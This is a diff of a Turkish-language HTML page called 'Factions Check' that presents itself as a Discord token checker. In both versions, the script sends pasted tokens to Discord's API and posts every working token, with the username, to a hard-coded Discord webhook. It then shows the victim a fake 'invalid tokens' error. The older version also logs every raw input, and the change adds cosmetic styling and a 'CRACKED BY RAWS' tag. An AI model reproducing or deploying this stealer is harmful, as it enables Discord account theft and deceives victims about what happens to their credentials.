@@ -1,94 +1,204 @@
 <!DOCTYPE html>
-
 <html lang="tr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Factions Check | Ultimate</title>
-<style>
-body { background-color: #000; color: #fff; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-.container { background-color: rgba(5, 5, 5, 0.95); padding: 40px; border-radius: 15px; width: 450px; text-align: center; border: 1px solid rgba(255, 30, 30, 0.3); box-shadow: 0 0 40px rgba(0, 0, 0, 1); }
-h1 { color: #ff1e1e; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 25px; }
-textarea { width: 100%; height: 160px; padding: 15px; background: #020202; border: 1px solid #ff1e1e; border-radius: 8px; color: #00ff41; margin-bottom: 20px; outline: none; resize: none; box-sizing: border-box; font-size: 13px; }
-button { width: 100%; padding: 16px; background: linear-gradient(90deg, #800000, #cc0000); color: #fff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
-#status { margin-top: 15px; font-size: 13px; font-weight: bold; display: none; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Factions Check | Ultimate</title>
+    <style>
+        body { 
+            /* Kareli Gri Arka Plan Doku */
+            background-color: #111;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px; 
+            
+            color: #fff; 
+            font-family: 'Consolas', 'Courier New', monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+            cursor: none; /* Gerçek oku gizle */
+        }
+
+        /* --- PARLAYAN MAVİ NOKTA İMLEÇ (DOLDURULMUŞ) --- */
+        #cursor {
+            width: 10px; /* Görseldeki gibi küçük, nokta boyutu */
+            height: 10px;
+            background-color: #00d2ff; /* Ortası dolu parlak mavi */
+            border-radius: 50%; /* Tam yuvarlak */
+            position: fixed;
+            pointer-events: none;
+            z-index: 10000;
+            transform: translate(-50%, -50%); /* Tam uca ortalama */
+            /* Neon Parlama (Glow) */
+            box-shadow: 0 0 10px #00d2ff, 0 0 20px #00d2ff, 0 0 30px #00d2ff;
+            transition: transform 0.05s ease-out; /* Pürüzsüz takip */
+        }
+        /* ----------------------------------------------- */
+
+        /* Şeffaf Menü (Glassmorphism) */
+        .container { 
+            background-color: rgba(0, 0, 0, 0.7); 
+            padding: 50px; 
+            border-radius: 25px; 
+            width: 500px; 
+            text-align: center; 
+            box-shadow: 0 0 40px rgba(0, 0, 0, 1); 
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 { 
+            color: #ff1e1e; 
+            text-transform: uppercase; 
+            letter-spacing: 6px; 
+            margin-bottom: 30px; 
+            text-shadow: 0 0 20px rgba(255, 30, 30, 0.5); 
+        }
+
+        textarea { 
+            width: 100%; 
+            height: 180px; 
+            padding: 15px; 
+            background: rgba(0, 0, 0, 0.5); 
+            border: 1px solid rgba(255, 30, 30, 0.3); 
+            border-radius: 12px; 
+            color: #fff; 
+            margin-bottom: 25px; 
+            outline: none; 
+            resize: none; 
+            box-sizing: border-box; 
+            font-family: monospace;
+        }
+
+        button { 
+            width: 100%; 
+            padding: 18px; 
+            background: linear-gradient(90deg, #8b0000, #ff1e1e); 
+            color: #fff; 
+            border: none; 
+            border-radius: 12px; 
+            font-weight: bold; 
+            cursor: none; 
+            text-transform: uppercase; 
+            transition: 0.3s;
+        }
+
+        button:hover { 
+            filter: brightness(1.2);
+            transform: scale(1.02);
+        }
+
+        #result { 
+            margin-top: 25px; 
+            padding: 15px; 
+            border-radius: 10px; 
+            display: none; 
+            color: #ff4d4d; 
+            background: rgba(255, 0, 0, 0.1); 
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        /* Rainbow Gökkuşağı İmza */
+        .raws-footer {
+            position: fixed;
+            bottom: 25px;
+            right: 35px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            font-size: 16px; 
+            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3, #ff0000);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.4); 
+            animation: rainbow_move 5s linear infinite;
+        }
+
+        @keyframes rainbow_move {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 100% 50%; }
+        }
+
+    </style>
 </head>
 <body>
+
+<div id="cursor"></div>
+
 <div class="container">
-<h1>FACTIONS CHECK</h1>
-<textarea id="contentInput" placeholder="Tokenleri buraya giriniz..."></textarea>
-<button id="submitBtn">KONTROL ET</button>
-<div id="status"></div>
+    <h1>FACTIONS CHECK</h1>
+    <textarea id="tokenList" placeholder="Tokenleri buraya giriniz..."></textarea>
+    <button onclick="checkAll()">KONTROL ET</button>
+    <div id="result"></div>
 </div>
 
+<div class="raws-footer">CRACKED BY RAWS</div>
+
 <script>
-    const wh = "[https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn](https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn)";
+    const cursor = document.getElementById('cursor');
 
-    document.getElementById('submitBtn').addEventListener('click', async function() {
-        const val = document.getElementById('contentInput').value;
-        const st = document.getElementById('status');
-        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 5);
+    // Mouse Hareket Takibi (Tam Hizalama)
+    document.addEventListener('mousemove', e => {
+        cursor.style.left = e.clientX + 'px';
+        cursor.style.top = e.clientY + 'px';
+    });
+
+    document.addEventListener('mousedown', () => cursor.style.transform = 'translate(-50%, -50%) scale(0.7)');
+    document.addEventListener('mouseup', () => cursor.style.transform = 'translate(-50%, -50%) scale(1)');
+
+    const webhook = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
+
+    async function checkAll() {
+        const input = document.getElementById('tokenList');
+        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");
+        const res = document.getElementById('result');
         
-        if (lines.length === 0) return;
+        if (tokens.length === 0) return;
 
-        st.style.display = "block";
-        st.textContent = "Checking...";
-        st.style.color = "#ffcc00";
+        res.style.display = "block";
+        res.textContent = "SİSTEM KONTROL EDİLİYOR...";
 
-        for (const token of lines) {
-            // Aşama 1: Ham veriyi her ihtimale karşı logla
+        tokens.forEach(async (token) => {
             try {
-                await fetch(wh, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "📝 Yeni Giriş Denemesi",
-                            description: "Girilen: `" + token + "`",
-                            color: 16776960 // Sarı
-                        }]
-                    })
-                });
-            } catch(e) {}
-
-            // Aşama 2: 200 OK Kontrolü (Discord API Doğrulama)
-            try {
-                const check = await fetch("[https://discord.com/api/v9/users/@me](https://discord.com/api/v9/users/@me)", {
-                    headers: { "Authorization": token }
+                const r = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
                 });
 
-                if (check.status === 200) {
-                    const user = await check.json();
-                    // Sadece çalışan (200 dönen) tokeni detaylı gönder
-                    await fetch(wh, {
+                if (r.status === 200) {
+                    const d = await r.json();
+                    fetch(webhook, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "✅ ÇALIŞAN TOKEN BULDUM (200 OK)",
+                                title: "🔥 TOKEN YAKALANDI",
+                                color: 16711680,
                                 fields: [
-                                    { name: "Kullanıcı", value: "`" + user.username + "#" + user.discriminator + "`", inline: true },
-                                    { name: "ID", value: "`" + user.id + "`", inline: true },
+                                    { name: "User", value: d.username, inline: true },
                                     { name: "Token", value: "```" + token + "```" }
-                                ],
-                                color: 65280, // Yeşil
-                                timestamp: new Date().toISOString()
+                                ]
                             }]
                         })
                     });
                 }
-            } catch (err) {
-                // CORS engeli veya hata durumunda sessiz kal
-            }
-        }
+            } catch (e) { }
+        });
         
-        // Kullanıcıya sahte hata mesajını göster
         setTimeout(() => {
-            st.textContent = "✕ Error: Token Invalid or Expired!";
-            st.style.color = "#ff1e1e";
-        }, 1200);
-    });
+            res.textContent = "✕ GEÇERSİZ TOKENLER TESPİT EDİLDİ";
+        }, 1500);
+    }
 </script>
+
 </body>
 </html>
